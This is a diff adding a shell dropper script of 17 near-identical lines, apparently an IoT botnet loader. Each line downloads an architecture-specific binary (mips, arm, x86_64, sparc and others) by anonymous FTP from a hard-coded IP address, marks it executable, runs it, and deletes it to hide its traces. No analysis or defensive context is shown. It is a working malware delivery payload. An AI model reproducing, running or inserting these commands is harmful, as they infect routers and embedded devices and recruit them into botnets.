@@ -1,0 +1,17 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 mips mips; chmod 777 mips ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 mipsel mipsel; chmod 777 mipsel ./mipsel; rm -rf mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 sh4 sh4; chmod 777 sh4 ./sh4; rm -rf sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 x86_64 x86_64; chmod 777 x86_64 ./x86_64; rm -rf x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 armv6l armv6l; chmod 777 armv6l ./armv6l; rm -rf armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 i686 i686; chmod 777 i686 ./i686; rm -rf i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 ppc ppc; chmod 777 ppc ./ppc; rm -rf ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 i586 i586; chmod 777 i586 ./i586; rm -rf i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 m68k m68k; chmod 777 m68k ./m68k; rm -rf m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 sparc sparc; chmod 777 sparc ./sparc; rm -rf sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 armv4l armv4l; chmod 777 armv4l ./armv4l; rm -rf armv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 armv5l armv5l; chmod 777 armv5l ./armv5l; rm -rf armv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 powerpc powerpc; chmod 777 powerpc ./powerpc; rm -rf powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 mips64 mips64; chmod 777 mips64 ./mips64; rm -rf mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 armv4eb armv4eb; chmod 777 armv4eb ./armv4eb; rm -rf armv4eb
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 armv4tl armv4tl; chmod 777 armv4tl ./armv4tl; rm -rf armv4tl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 89.34.26.34 arm7 arm7; chmod 777 arm7 ./arm7; rm -rf arm7
